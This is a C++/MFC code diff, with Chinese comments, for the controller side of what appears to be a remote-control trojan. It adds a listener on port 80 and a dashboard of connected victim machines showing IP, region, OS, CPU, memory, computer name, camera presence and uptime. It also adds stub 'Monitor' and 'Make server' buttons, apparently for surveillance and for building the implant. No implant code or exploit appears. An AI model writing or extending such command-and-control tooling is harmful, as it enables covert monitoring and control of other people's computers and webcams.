@@ -52,17 +52,25 @@ CClientDlg::CClientDlg(CWnd* pParent /*=NULL*/)
 	: CDialogEx(CClientDlg::IDD, pParent)
 {
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
+	m_pListenThread = NULL;
 }
 
 void CClientDlg::DoDataExchange(CDataExchange* pDX)
 {
 	CDialogEx::DoDataExchange(pDX);
+	DDX_Control(pDX, IDC_LIST_MSG, m_listMsg);
+	DDX_Control(pDX, IDC_LIST_COMPUTER, m_listComputer);
 }
 
 BEGIN_MESSAGE_MAP(CClientDlg, CDialogEx)
 	ON_WM_SYSCOMMAND()
 	ON_WM_PAINT()
 	ON_WM_QUERYDRAGICON()
+	ON_BN_CLICKED(ID_MONITOR, &CClientDlg::OnBnClickedMonitor)
+	ON_BN_CLICKED(ID_MAKESERVER, &CClientDlg::OnBnClickedMakeserver)
+
+	
+	ON_MESSAGE(WM_CONNECT_CLIENT,OnConnectClient)
 END_MESSAGE_MAP()
 
 
@@ -97,8 +105,10 @@ BOOL CClientDlg::OnInitDialog()
 	SetIcon(m_hIcon, TRUE);			// 设置大图标
 	SetIcon(m_hIcon, FALSE);		// 设置小图标
 
-	// TODO: 在此添加额外的初始化代码
-
+	// TODO: 在此添加额外的初始化代码		
+	InitControls();
+	m_nListenPort = 80;
+	StartListenThread();
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
 
@@ -151,3 +161,190 @@ HCURSOR CClientDlg::OnQueryDragIcon()
 	return static_cast<HCURSOR>(m_hIcon);
 }
 
+
+
+
+void CClientDlg::OnBnClickedMonitor()
+{
+	// TODO: 在此添加控件通知处理程序代码
+}
+
+
+
+void CClientDlg::OnBnClickedMakeserver()
+{
+	// TODO: 在此添加控件通知处理程序代码
+}
+
+
+
+
+void CClientDlg::InitControls(void) {
+	m_listComputer.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_FLATSB|LVS_EX_GRIDLINES);
+	m_listComputer.SetTextColor(RGB(0,0,255));
+
+	int nFmt = LVCFMT_CENTER;
+	int iSub = 0;
+	
+	m_listComputer.InsertColumn(iSub ++,"所属地区",		LVCFMT_CENTER,200);	
+	m_listComputer.InsertColumn(iSub ++,"IP地址",		LVCFMT_CENTER,120);
+	m_listComputer.InsertColumn(iSub ++,"操作系统类型",	LVCFMT_CENTER,150);
+	m_listComputer.InsertColumn(iSub ++,"CPU描述",		LVCFMT_CENTER,300);
+	m_listComputer.InsertColumn(iSub ++,"内存大小",		LVCFMT_CENTER,80);	
+	m_listComputer.InsertColumn(iSub ++,"计算机名称",	LVCFMT_CENTER,120);
+	m_listComputer.InsertColumn(iSub ++,"摄像头",		LVCFMT_CENTER,80);
+	m_listComputer.InsertColumn(iSub ++,"运行时间",		LVCFMT_CENTER,150);
+	m_listComputer.InsertColumn(iSub ++,"上线时间",		LVCFMT_CENTER,150);
+
+	m_listComputer.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_FLATSB|LVS_EX_GRIDLINES);
+	m_listMsg.InsertColumn(iSub ++,"控制消息",		LVCFMT_LEFT,650);
+}
+
+// 开始客户端发送和接收过程
+BOOL CClientDlg::StartListenThread()
+{
+	StopListenThread();
+	
+	m_pListenThread = new CListenConnectionThread(m_hWnd,m_nListenPort);
+	CheckPointer(m_pListenThread,FALSE);
+	
+	m_pListenThread->ResumeThread();
+	 return TRUE;
+}
+
+// 停止客户端发送和接收过程
+BOOL CClientDlg::StopListenThread()
+{
+	SAFE_DELETE(m_pListenThread);
+	return TRUE;
+}
+LRESULT CClientDlg::OnConnectClient(WPARAM wParam,LPARAM lParam)
+{
+	if(m_pListenThread == NULL)
+		return 0;
+	
+	BOOL bConnected = (BOOL)wParam;
+	SOCKET hSocket  = (SOCKET)lParam;
+	CString strMsg,strAction,strIP,strAddress;
+	
+	strIP		= m_pListenThread->GetServerIP(hSocket);
+	strAddress	= m_pListenThread->GetServerAddress(hSocket);
+
+	if(bConnected)
+	{
+		// 上线
+		
+		// 更新列表
+		RefreshComputerList();
+		
+		strAction.LoadString(IDS_STRING_ONLINE);
+	}
+	else
+	{
+		// 下线
+		m_pListenThread->DeleteComputer(hSocket);
+		
+		// 更新列表
+		RefreshComputerList();
+		
+		strAction.LoadString(IDS_STRING_OFFLINE);
+	}
+
+	strMsg.Format("%s IP地址: %s 物理地址: %s",strAction,strIP,strAddress);
+	AddMsgToList(strMsg);
+	return 1;
+}
+
+
+// 刷新计算机列表
+BOOL CClientDlg::RefreshComputerList()
+{
+	CheckPointer(m_pListenThread,FALSE);
+
+	m_listComputer.DeleteAllItems();
+	SERVER_REMOTE_S emServer;
+	int nOnLine = m_pListenThread->m_arrServer.GetSize();
+	for(int nIndex = 0; nIndex < nOnLine; nIndex ++)
+	{
+		emServer = m_pListenThread->m_arrServer.GetAt(nIndex);
+		
+		AddMsgToComputerList(emServer);
+	}
+	
+
+	return TRUE;
+}
+// 向消息列表添加控制消息
+void CClientDlg::AddMsgToList(CString strMsg)
+{
+	m_listMsg.InsertItem(0,strMsg);
+}
+
+// 向计算机列表添加信息
+BOOL CClientDlg::AddMsgToComputerList(SERVER_REMOTE_S emServerInfo)
+{
+	BOOL bRes = TRUE;
+
+	int nItem			= m_listComputer.GetItemCount();
+	int nSub			= 1;
+
+	CString strSysVersion,strMemory,strCamera,strRunTime,strOnlineTime;
+
+	// 所属地区
+	m_listComputer.InsertItem(nItem,emServerInfo.szAddress,emServerInfo.emSystemInfo.bHaveCamera ? 1 : 0);
+	
+	// IP地址
+	m_listComputer.SetItemText(nItem,nSub ++,emServerInfo.szServerIP);
+	
+	// 操作系统类型
+	strSysVersion = GetSystemEditionString(emServerInfo.emSystemInfo.dwMajorVersion,emServerInfo.emSystemInfo.dwMinorVersion,emServerInfo.emSystemInfo.dwPlatformId);
+	m_listComputer.SetItemText(nItem,nSub ++,strSysVersion);
+
+	// CPU描述
+	m_listComputer.SetItemText(nItem,nSub ++,emServerInfo.emSystemInfo.szCPUType);
+
+	// 内存大小
+	strMemory.Format(_T("%d M"), emServerInfo.emSystemInfo.dwMemorySize);	
+	m_listComputer.SetItemText(nItem,nSub ++,strMemory);	
+	
+	// 计算机名称
+	m_listComputer.SetItemText(nItem,nSub ++,emServerInfo.emSystemInfo.szComputerName);
+	
+	// 当前用户名称
+//	m_listComputer.SetItemText(nItem,nSub ++,emServerInfo.emSystemInfo.szUserName);	
+
+	// 摄像头
+	strCamera = emServerInfo.emSystemInfo.bHaveCamera ? _T("有") : _T("没有");
+	m_listComputer.SetItemText(nItem,nSub ++,strCamera);
+	
+	// 运行时间
+	strRunTime.Format("%d天 %d小时 %d分 %d秒",emServerInfo.emSystemInfo.nRunDays,emServerInfo.emSystemInfo.nRunHours,emServerInfo.emSystemInfo.nRunMinutes,emServerInfo.emSystemInfo.nRunSenconds);
+	m_listComputer.SetItemText(nItem,nSub ++,strRunTime);
+	
+	// 上线时间
+	strOnlineTime = CTime::GetCurrentTime().Format("%Y-%m-%d %H:%M:%S");
+	m_listComputer.SetItemText(nItem,nSub ++,strOnlineTime);	
+
+	return TRUE;
+}
+// 获取操作系统类型
+CString CClientDlg::GetSystemEditionString(DWORD dwMajorVersion,DWORD dwMinorVersion, DWORD dwPlatformId)
+{
+	CString strRet;
+	switch(dwPlatformId)
+	{
+	case VER_PLATFORM_WIN32_NT:
+        if(dwMajorVersion <= 4)
+			strRet = "Windows NT";
+        if(dwMajorVersion == 5 && dwMinorVersion == 0)
+            strRet = "Windows 2000";
+        if(dwMajorVersion == 5 && dwMinorVersion == 1)
+			strRet = "Windows XP";
+        if(dwMajorVersion == 5 && dwMinorVersion == 2)
+			strRet = "Windows Server 2003";
+		break;
+	default:
+		strRet = "未知版本";
+	}
+	return strRet;
+}
